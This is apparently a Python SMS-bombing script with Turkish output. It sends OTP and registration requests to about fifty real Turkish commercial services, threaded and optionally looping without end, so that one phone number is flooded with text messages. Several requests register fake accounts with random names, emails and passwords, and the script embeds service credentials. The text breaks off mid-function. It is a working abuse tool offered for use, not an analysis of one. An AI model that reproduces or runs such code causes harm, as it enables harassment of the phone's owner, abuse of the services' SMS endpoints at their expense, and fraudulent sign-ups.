import requests, os, random, json, uuid, time, string, urllib.parse, urllib3, urllib3.exceptions, threading


class helloScreen():
  
  clear = lambda: os.system("cls")
  counter = 0
  success = 0
  failed = 0

  def startScreen():
    
    helloScreen.clear()
    helloScreen.counter = 0
    helloScreen.success = 0
    helloScreen.failed = 0    
    helloScreen.userSettings()


  def printConsole(result, service, count, success=0, failed=0):

    helloScreen.counter += count
    helloScreen.success += success
    helloScreen.failed += failed
    
    print("[" + str(result) + "]" + " | " + str(helloScreen.counter) + " | " + service)


  def startSend(number, count):

    helloScreen.clear()
    print(str(number) + " numarasına SMS gönderimi başlatıldı!" + "\n")
    
    start_time = int(time.perf_counter())
    counter = 0

    functions = [services.a101, services.aygaz, services.bim, services.bisu, services.ceptesok, 
    services.coffy, services.defacto, services.file, services.gez, services.gofody, services.anadolu, 
    services.hayat, services.heyscooter, services.hizliecza, services.ikinciyeni, services.ipragraz, 
    services.istegelsin, services.jetle, services.kalmasin, services.migros, services.mopas, 
    services.ninewest, services.paybol, services.pawapp, services.pisir, services.goyakit, 
    services.rabbit, services.roombadi, services.qumpara, services.saka, services.pinarsu, 
    services.scooby, services.signalall, services.superpedestrian, services.sushico, services.tazi, 
    services.tiklagelsin, services.tornetscooter, services.weescooter, services.yotto, 
    services.oliz, services.macrocenter, services.marti, services.karma, services.joker, 
    services.hop, services.kimgbister, services.total, services.englishhome, services.petrolofisi]
    
    random.shuffle(functions)

    if count == 0:
      while True:
        threading.Thread(target=functions[count](number=number)).start()
        count += 1
        if count == len(functions):
            count = 0
    else:
      for i in range(count):
        threading.Thread(target=functions[i % 50](number=number)).start()
      
      
      print("\n" + "Gönderim tamamlandı!")
      print(helloScreen.counter, "SMS,", int(time.perf_counter()) - start_time, "saniye içerisinde gönderildi.", helloScreen.success, "başarılı,", helloScreen.failed, "başarısız.")
          
      helloScreen.restart()


class services():

  def a101(number):
    try:

      url = "https://www.a101.com.tr/users/otp-login/"
      
      payload = {
        "phone" : f"0{number}"
      }
      
      r = requests.post(url=url, json=payload, timeout=6)
      
      if r.status_code == 200:
        helloScreen.printConsole(result="+", service="A101", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="A101", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="A101", count=+1, failed=+1)


  def bim(number):
    try:

      url = "https://bim.veesk.net/service/v1.0/account/login"
      
      payload = {
        "phone" : f"90{number}"
      }
      
      r = requests.post(url=url, json=payload, timeout=6)
      
      if r.status_code == 200:
        helloScreen.printConsole(result="+", service="BIM", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="BIM", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="BIM", count=+1, failed=+1)


  def defacto(number):
    try:

      url = "https://www.defacto.com.tr/Customer/SendPhoneConfirmationSms"
      
      payload = {
          "mobilePhone" : f"0{number}"
      }

      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["Data"]
      
      if r1 == "IsSMSSend":
        helloScreen.printConsole(result="+", service="Defacto", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Defacto", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Defacto", count=+1, failed=+1)


  def istegelsin(number):
    try:

      url = "https://prod.fasapi.net/"
      
      payload = {
        "query" : "\n        mutation SendOtp2($phoneNumber: String!) {\n          sendOtp2(phoneNumber: $phoneNumber) {\n            alreadySent\n            remainingTime\n          }\n        }",
        "variables" : {
          "phoneNumber" : f"90{number}"
        }
      }

      r = requests.post(url=url, json=payload, timeout=6)
      
      if r.status_code == 200:
        helloScreen.printConsole(result="+", service="Iste Gelsin", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Iste Gelsin", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Iste Gelsin", count=+1, failed=+1)


  def ikinciyeni(number):
    try:

      url = "https://apigw.ikinciyeni.com/RegisterRequest"

      payload = {
        "accountType" : 1,
        "email" : f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=12))}@gmail.com",
        "isAddPermission" : False,
        "name" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
        "lastName" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase, k=8))}",
        "phone" : f"{number}"
      }

      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["isSucceed"]

      if r1 == True:
        helloScreen.printConsole(result="+", service="Iki Yeni", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Iki Yeni", count=+1, failed=+1)
  
    except:
      helloScreen.printConsole(result="-", service="Iki Yeni", count=+1, failed=+1)


  def migros(number):
    try:
      
      url = "https://www.migros.com.tr/rest/users/login/otp"
      
      payload =  {
          "phoneNumber" : f"{number}"
      }
      
      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["successful"]
      
      if r1 == True:
        helloScreen.printConsole(result="+", service="Migros", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Migros", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Migros", count=+1, failed=+1)


  def ceptesok(number):
    try:
      
      url = "https://api.ceptesok.com/api/users/sendsms"
      
      payload = {
        "mobile_number" : f"{number}",
        "token_type" : "register_token"
      }
      
      r = requests.post(url=url, json=payload, timeout=6)
      
      if r.status_code == 200:
        helloScreen.printConsole(result="+", service="Cepte Şok", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Cepte Şok", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Cepte Şok", count=+1, failed=+1)


  def tiklagelsin(number):
    try:

      url = "https://www.tiklagelsin.com/user/graphql"
      
      payload = {
        "operationName" : "GENERATE_OTP",
        "variables" : {
          "phone" : f"+90{number}",
          "challenge" : f"{uuid.uuid4()}",
          "deviceUniqueId" : f"web_{uuid.uuid4()}"
        },
        "query" : "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) {\n  generateOtp(\n    phone: $phone\n    challenge: $challenge\n    deviceUniqueId: $deviceUniqueId\n  )\n}\n"
      }
      
      r = requests.post(url=url, json=payload, timeout=6)
      
      if r.status_code == 200:
        helloScreen.printConsole(result="+", service="Tıkla Gelsin", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Tıkla Gelsin", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Tıkla Gelsin", count=+1, failed=+1)


  def bisu(number):
    try:
      
      url = "https://www.bisu.com.tr/api/v2/app/authentication/phone/register"
      
      payload = {
        "phoneNumber" : f"{number}"
      }
      
      r = requests.post(url=url, json=payload, timeout=6)
      
      if r.status_code == 200:
        helloScreen.printConsole(result="+", service="BiSU", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="BiSU", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="BiSU", count=+1, failed=+1)


  def file(number):
    try:

      url = "https://api.filemarket.com.tr/v1/otp/send"
      
      payload = {
        "mobilePhoneNumber" : f"90{number}"
      }
      
      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["data"]
      
      if r1 == "200 OK":
        helloScreen.printConsole(result="+", service="File Market", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="File Market", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="File Market", count=+1, failed=+1)


  def ipragraz(number):
    try:
      
      url = "https://ipapp.ipragaz.com.tr/ipragazmobile/v2/ipragaz-b2c/ipragaz-customer/mobile-register-otp"
      
      payload = {
        "otp" : "",
        "phoneNumber" : f"{number}"
      }
      
      r = requests.post(url=url, json=payload, timeout=6)
      
      if r.status_code == 200:
        helloScreen.printConsole(result="+", service="Ipragaz", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Ipragaz", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Ipragaz", count=+1, failed=+1)


  def pisir(number):
    try:

      url = "https://api.pisir.com/v1/login/"
      
      payload = {
        "msisdn" : f"90{number}"
      }
      
      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["ok"]
      
      if r1 == "1":
        helloScreen.printConsole(result="+", service="Pişir", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Pişir", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Pişir", count=+1, failed=+1)


  def coffy(number):
    try:

      url = "https://prod-api-mobile.coffy.com.tr/Account/Account/SendVerificationCode"
      
      payload = {
        "phoneNumber" : f"+90{number}"
      }
      
      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["success"]
      
      if r1 == True:
        helloScreen.printConsole(result="+", service="Coffy", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Coffy", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Coffy", count=+1, failed=+1)


  def sushico(number):
    try:

      url = "https://api.sushico.com.tr/tr/sendActivation"
      
      payload = {
        "phone" : f"+90{number}",
        "location" : 1,
        "locale" : "tr"
      }

      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["err"]
      
      if r1 == 0:
        helloScreen.printConsole(result="+", service="SushiCo", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="SushiCo", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="SushiCo", count=+1, failed=+1)


  def kalmasin(number):
    try:

      url = "https://api.kalmasin.com.tr/user/login"
      
      payload = {
        "dil" : "tr",
        "device_id" : "",
        "notification_mobile" : "android-notificationid-will-be-added",
        "platform" : "android",
        "version" : "2.0.6",
        "login_type" : 1,
        "telefon" : f"{number}"
      }
      
      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["success"]
      
      if r1 == True:
        helloScreen.printConsole(result="+", service="Kalmasın", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Kalmasın", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Kalmasın", count=+1, failed=+1)


  def yotto(number):
    try:

      url = "https://42577.smartomato.ru/account/session.json"
      
      payload = {
        "phone" : f"+90 ({str(number)[0:3]}) {str(number)[3:6]}-{str(number)[6:10]}"
      }
      
      r = requests.post(url=url, json=payload, timeout=6)
      
      if r.status_code == 201:
        helloScreen.printConsole(result="+", service="Yotto", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Yotto", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Yotto", count=+1, failed=+1)


  def qumpara(number):
    try:

      url = "https://tr-api.fisicek.com/v1.4/auth/getOTP"
      
      payload = {
          "msisdn" : f"{number}"
      }
      
      r = requests.post(url=url, json=payload, timeout=6)
      
      if r.status_code == 200:
        helloScreen.printConsole(result="+", service="Qumpara", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Qumpara", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Qumpara", count=+1, failed=+1)


  def aygaz(number):
    try:
      
      url = "https://ecommerce-memberapi.aygaz.com.tr/api/Membership/SendVerificationCode"
      
      payload = {
        "Gsm" : f"{number}"
      }
      
      r = requests.post(url=url, json=payload, timeout=6)
      
      if r.status_code == 200:
        helloScreen.printConsole(result="+", service="Aygaz", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Aygaz", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Aygaz", count=+1, failed=+1)


  def pawapp(number):
    try:
      
      url = "https://api.pawder.app/api/authentication/sign-up"
      
      payload = {
        "languageId" : "2",
        "mobileInformation" : "",
        "data" : {
          "firstName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
          "lastName" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}",
          "userAgreement" : "true",
          "kvkk" : "true",
          "email" : f"{''.join(random.choices(string.ascii_lowercase, k=10))}@gmail.com",
          "phoneNo" : f"{number}",
          "username" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=10))}"
        }
      }
      
      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["success"]
      
      if r1 == True:
        helloScreen.printConsole(result="+", service="PawAPP", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="PawAPP", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="PawAPP", count=+1, failed=+1)


  def mopas(number):
    try:

      url = "https://api.mopas.com.tr//authorizationserver/oauth/token?client_id=mobile_mopas&client_secret=secret_mopas&grant_type=client_credentials"
      
      r = requests.post(url=url, timeout=2)
      
      if r.status_code == 200:
          
          token = json.loads(r.text)["access_token"]
          token_type = json.loads(r.text)["token_type"]
          
          
          url = f"https://api.mopas.com.tr//mopaswebservices/v2/mopas/sms/sendSmsVerification?mobileNumber={number}"
          
          headers = {
              "authorization" : f"{token_type} {token}"
          }
          
          r1 = requests.get(url=url, headers=headers, timeout=2)
          
          if r1.status_code == 200:
            helloScreen.printConsole(result="+", service="Mopaş", count=+1, success=+1)
          else:
            helloScreen.printConsole(result="-", service="Mopaş", count=+1, failed=+1)
      else:
          helloScreen.printConsole(result="-", service="Mopaş", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Mopaş", count=+1, failed=+1)


  def paybol(number):
    try:

      url = "https://pyb-mobileapi.walletgate.io/v1/Account/RegisterPersonalAccountSendOtpSms"

      payload = {
        "otp_code" : "null",
        "phone_number" : f"90{number}",
        "reference_id" : "null"
      }

      r = requests.post(url=url, json=payload, timeout=6)

      if r.status_code == 200:
        helloScreen.printConsole(result="+", service="Paybol", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Paybol", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Paybol", count=+1, failed=+1)


  def ninewest(number):
    try:

      url = "https://www.ninewest.com.tr/webservice/v1/register.json"

      payload = {
        "alertMeWithEMail" : False,
        "alertMeWithSms" : False,
        "dataPermission" : True,
        "email" : "asdafwqww44wt4t4@gmail.com",
        "genderId" : random.randint(0,3),
        "hash" : "5488b0f6de",
        "inviteCode" : "",
        "password" : f"{''.join(random.choices(string.ascii_lowercase + string.ascii_uppercase + string.digits, k=16))}",
        "phoneNumber" : f"({str(number)[0:3]}) {str(number)[3:6]} {str(number)[6:8]} {str(number)[8:10]}",
        "registerContract" : True,
        "registerMethod" : "mail",
        "version" : "3"
      }

      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["success"]

      if r1 == True:
        helloScreen.printConsole(result="+", service="Nine West", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Nine West", count=+1, failed=+1)

    except:
      helloScreen.printConsole(result="-", service="Nine West", count=+1, failed=+1)


  def saka(number):
    try:

      url = "https://mobilcrm2.saka.com.tr/api/customer/login"

      payload = {
        "gsm" : f"0{number}"
      }

      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["status"]

      if r1 == 1:
        helloScreen.printConsole(result="+", service="Saka", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Saka", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Saka", count=+1, failed=+1)


  def superpedestrian(number):
    try:

      url = "https://consumer-auth.linkyour.city/consumer_auth/register"

      payload = {
        "phone_number" : f"+90{str(number)[0:3]} {str(number)[3:6]} {str(number)[6:10]}"
      }

      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["detail"]

      if r1 == "Ok":
        helloScreen.printConsole(result="+", service="Superpedestrian", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Superpedestrian", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Superpedestrian", count=+1, failed=+1)


  def hayat(number):
    try:

      url = f"https://www.hayatsu.com.tr/api/signup/otpsend?mobilePhoneNumber={number}"

      r = requests.post(url=url, timeout=6)
      r1 = json.loads(r.text)["IsSuccessful"]

      if r1 == True:
        helloScreen.printConsole(result="+", service="Hayat", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Hayat", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Hayat", count=+1, failed=+1)


  def tazi(number):
    try:

      url = "https://mobileapiv2.tazi.tech/C08467681C6844CFA6DA240D51C8AA8C/uyev2/smslogin"

      payload = {
        "cep_tel" : f"{number}",
        "cep_tel_ulkekod" : "90"
      }

      headers = {
          "authorization" : "Basic dGF6aV91c3Jfc3NsOjM5NTA3RjI4Qzk2MjRDQ0I4QjVBQTg2RUQxOUE4MDFD"
      }

      r = requests.post(url=url, headers=headers, json=payload, timeout=6)

      if r.status_code == 200:
        helloScreen.printConsole(result="+", service="Tazı", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Tazı", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Tazı", count=+1, failed=+1)


  def gofody(number):
    try:

      url = "https://backend.gofody.com/api/v1/enduser/register/"

      payload = {
        "country_code" : "90",
        "phone" : f"{number}"
      }

      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["success"]

      if r1 == True:
        helloScreen.printConsole(result="+", service="GoFody", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="GoFody", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="GoFody", count=+1, failed=+1)


  def weescooter(number):
    try:

      url = "https://friendly-cerf.185-241-138-85.plesk.page/api/v1/members/gsmlogin"
      
      payload = {
        "tenant" : "62a1e7efe74a84ea61f0d588",
        "gsm" : f"{number}"
      }

      r = requests.post(url=url, json=payload, timeout=6)

      if r.status_code == 200:
        helloScreen.printConsole(result="+", service="Wee Scooter", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Wee Scooter", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Wee Scooter", count=+1, failed=+1)


  def scooby(number):
    try:

      url = f"https://sct.scoobyturkiye.com/v1/mobile/user/code-request?phoneNumber=90{number}"

      r = requests.get(url=url, timeout=6)

      if r.status_code == 200:
        helloScreen.printConsole(result="+", service="Scooby", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Scooby", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Scooby", count=+1, failed=+1)


  def gez(number):
    try:

      url = f"https://gezteknoloji.arabulucuyuz.net/api/Account/get-phone-number-confirmation-code-for-new-user?phonenumber=90{number}"

      r = requests.get(url=url, timeout=6)
      r1 = json.loads(r.text)["succeeded"]

      if r1 == True:
        helloScreen.printConsole(result="+", service="Gez", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Gez", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Gez", count=+1, failed=+1)


  def heyscooter(number):
    try:

      url = f"https://heyapi.heymobility.tech/V9//api/User/ActivationCodeRequest?organizationId=9DCA312E-18C8-4DAE-AE65-01FEAD558739&phonenumber={number}"

      headers = {
          "user-agent" : "okhttp/3.12.1"
      }

      r = requests.post(url=url, headers=headers, timeout=6)
      r1 = json.loads(r.text)["IsSuccess"]

      if r1 == True:
        helloScreen.printConsole(result="+", service="Hey Scooter", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Hey Scooter", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Hey Scooter", count=+1, failed=+1)


  def tornetscooter(number):
    try:

      url = "https://api.hergele.co/v2/checksms"

      payload = {
        "phoneNumber" : f"{number}",
        "countryTwo" : "TR",
        "countryCode" : "90",
        "SMSCode" : "SENDSMS"
      }

      headers = {
          "fleetname" : "tornet"
      }

      r = requests.post(url=url, headers=headers, json=payload, timeout=6)
      r1 = json.loads(r.text)["isRegistered"]

      if r1 == "true":
        helloScreen.printConsole(result="+", service="Tornet Scooter", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Tornet Scooter", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Tornet Scooter", count=+1, failed=+1)


  def jetle(number):
    try:

      url = f"http://ws.geowix.com/GeoCourier/SubmitPhoneToLogin?phonenumber={number}&firmaID=1048"

      r = requests.get(url=url, timeout=6)

      if r.status_code == 200:
        helloScreen.printConsole(result="+", service="Jetle", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Jetle", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Jetle", count=+1, failed=+1)


  def rabbit(number):
    try:

      url = "https://api.rbbt.com.tr/v1/auth/authenticate"

      payload = {
        "mobile_number" : f"+90{number}",
        "os_name" : "android",
        "os_version" : "7.1.2",
        "app_version" : " 1.0.2(12)",
        "push_id" : "-"
      }

      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["status"]

      if r1 == True:
        helloScreen.printConsole(result="+", service="Rabbit", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Rabbit", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Rabbit", count=+1, failed=+1)


  def roombadi(number):
    try:

      url =  "https://api.roombadi.com/api/v1/auth/otp/authenticate"

      payload =  {
        "phone" : f"{number}",
        "countryId" : 2
      }

      r = requests.post(url=url, json=payload, timeout=6)

      if r.status_code == 200:
        helloScreen.printConsole(result="+", service="Roombadi", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Roombadi", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Roombadi", count=+1, failed=+1)


  def hizliecza(number):
    try:

      url = "https://hizlieczaprodapi.hizliecza.net/mobil/account/sendOTP"

      payload = {
        "phoneNumber" : f"+90{number}",
        "otpOperationType" : 2
      }

      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["isSuccess"]

      if r1 == True:
        helloScreen.printConsole(result="+", service="Hızlı Ecza", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Hızlı Ecza", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Hızlı Ecza", count=+1, failed=+1)


  def signalall(number):
    try:
      url = "https://appservices.huzk.com/client/register"

      payload = {
        "name" : "",
        "phone" : {
          "number" : f"{number}",
          "code" : "90",
          "country_code" : "TR",
          "name" : ""
        },
        "countryCallingCode" : "+90",
        "countryCode" : "TR",
        "approved" : True,
        "notifyType" : 99,
        "favorites" : [],
        "appKey" : "live-exchange"
      }

      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["success"]

      if r1 == True:
        helloScreen.printConsole(result="+", service="SignalAll", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="SignalAll", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="SignalAll", count=+1, failed=+1)


  def goyakit(number):
    try:

      url = f"https://gomobilapp.ipragaz.com.tr/api/v1/0/authentication/sms/send?phone={number}&isRegistered=false"

      r = requests.get(url=url, timeout=6)
      r1 = json.loads(r.text)["data"]["success"]

      if r1 == True:
        helloScreen.printConsole(result="+", service="Go Yakıt", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Go Yakıt", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Go Yakıt", count=+1, failed=+1)


  def pinarsu(number):
    try:

      url = "https://pinarsumobileservice.yasar.com.tr/pinarsu-mobil/api/Customer/SendOtp"

      payload = {
        "MobilePhone" : f"{number}"
      }

      headers = {
        "devicetype" : "android",
      }

      r = requests.post(url=url, headers=headers, json=payload, timeout=6)

      if r.text == True:
        helloScreen.printConsole(result="+", service="Pınar", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Pınar", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Pınar", count=+1, failed=+1)


  def oliz(number):
    try:

      url = "https://api.oliz.com.tr/api/otp/send"

      payload = {
        "mobile_number" : f"{number}",
        "type" : None
      }

      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["meta"]["messages"]["success"][0]

      if r1 == "SUCCESS_SEND_SMS":
        helloScreen.printConsole(result="+", service="Oliz", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Oliz", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Oliz", count=+1, failed=+1)


  def macrocenter(number):
    try:

      url = f"https://www.macrocenter.com.tr/rest/users/login/otp?reid={int(time.time())}"

      payload = {
        "phoneNumber" : f"{number}"
      }

      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["successful"]

      if r1 == True:
        helloScreen.printConsole(result="+", service="Macro Center", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Macro Center", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Macro Center", count=+1, failed=+1)


  def marti(number):
    try:

      url = "https://customer.martiscooter.com/v13/scooter/dispatch/customer/signin"

      payload = {
        "mobilePhone" : f"{number}",
        "mobilePhoneCountryCode" : "90"
      }

      r = requests.post(url=url, json=payload, timeout=6)
      r1 = json.loads(r.text)["isSuccess"]

      if r1 == True:
        helloScreen.printConsole(result="+", service="Martı", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Martı", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Martı", count=+1, failed=+1)


  def karma(number):
    try:

      url = "https://api.gokarma.app/v1/auth/send-sms"

      payload = {
        "phoneNumber" : f"90{number}",
        "type" : "REGISTER",
        "deviceId" : f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}",
        "language" : "tr-TR"
      }

      r = requests.post(url=url, json=payload, timeout=6)

      if r.status_code == 201:
        helloScreen.printConsole(result="+", service="Karma", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Karma", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Karma", count=+1, failed=+1)


  def joker(number):
    try:

      url = "https://www.joker.com.tr:443/kullanici/ajax/check-sms"

      payload = {
        "phone" : f"{number}"
      }

      headers = {
        "user-agent" : ""
      }

      r = requests.post(url=url, headers=headers, data=payload, timeout=6)
      r1 = json.loads(r.text)["success"]

      if r1 == True:
        helloScreen.printConsole(result="+", service="Joker", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Joker", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Joker", count=+1, failed=+1)


  def hop(number):
    try:

      url = "https://api.hoplagit.com:443/v1/auth:reqSMS"

      payload = {
        "phone" : f"+90{number}"
      }

      r = requests.post(url=url, json=payload, timeout=6)

      if r.status_code == 201:
        helloScreen.printConsole(result="+", service="Hop", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Hop", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Hop", count=+1, failed=+1)


  def kimgbister(number):
    try:

      url = "https://3uptzlakwi.execute-api.eu-west-1.amazonaws.com:443/api/auth/send-otp"

      payload = {
        "msisdn" : f"90{number}"
      }

      r = requests.post(url=url, json=payload, timeout=6)

      if r.status_code == 200:
        helloScreen.printConsole(result="+", service="Kim GB Ister", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Kim GB Ister", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Kim GB Ister", count=+1, failed=+1)


  def anadolu(number):
    try:

      url = "https://www.anadolu.com.tr/Iletisim_Formu_sms.php"

      payload = urllib.parse.urlencode({
        "Numara" : f"{str(number)[0:3]} {str(number)[3:6]} {str(number)[6:8]} {str(number)[8:10]}"
      })

      headers = {
        "content-type" : "application/x-www-form-urlencoded; charset=UTF-8",
      }

      r = requests.post(url=url, headers=headers, data=payload, timeout=6)

      if r.status_code == 200:
        helloScreen.printConsole(result="+", service="Anadolu", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Anadolu", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Anadolu", count=+1, failed=+1)


  def total(number):

    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    try:

      url = f"https://mobileapi.totalistasyonlari.com.tr:443/SmartSms/SendSms?gsmNo={number}"

      r = requests.post(url=url, verify=False, timeout=6)
      r1 = json.loads(r.text)["success"]

      if r1 == True:
        helloScreen.printConsole(result="+", service="Total", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="Total", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="Total", count=+1, failed=+1)


  def englishhome(number):
    try:

      url = "https://www.englishhome.com:443/enh_app/users/registration/"

      payload = {
        "first_name" : f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
        "last_name" : f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
        "email" : f"{''.join(random.choices(string.ascii_lowercase + string.digits, k=16))}@gmail.com",
        "phone" : f"0{number}",
        "password" : f"{''.join(random.choices(string.ascii_lowercase + string.digits + string.ascii_uppercase, k=8))}",
        "email_allowed" : False,
        "sms_allowed" : False,
        "confirm" : True,
        "tom_pay_allowed" : True
      }

      r = requests.post(url=url, json=payload, timeout=6)

      if r.status_code == 202:
        helloScreen.printConsole(result="+", service="English Home", count=+1, success=+1)
      else:
        helloScreen.printConsole(result="-", service="English Home", count=+1, failed=+1)
    except:
      helloScreen.printConsole(result="-", service="English Home", count=+1, failed=+1)


  def petrolofisi(number):
    try:

      url = "https://mobilapi.petrolofisi.com.tr:443/api/auth/register"

      payload = {
        "approvedContractVersion" : "v1",
        "approvedKvkkVersion" : "v1",
        "contractPermission" : True,
        "deviceId" : "",
        "etkContactPermission" : True,
        "kvkkPermission" : True,
        "mobilePhone" : f"0{number}",
        "name" : f"{''.join(random.choices(string.ascii_lowercase, k=8))}",
        "plate" : f"{str(random.randrange(1, 81)).zfill(2)}{''.join(random.choices(string.ascii_uppercase, k=3))}{str(random.randrange(1, 999)).zfill(3)}",
        "positiveCard" : "",
        "referenceCode" : "",
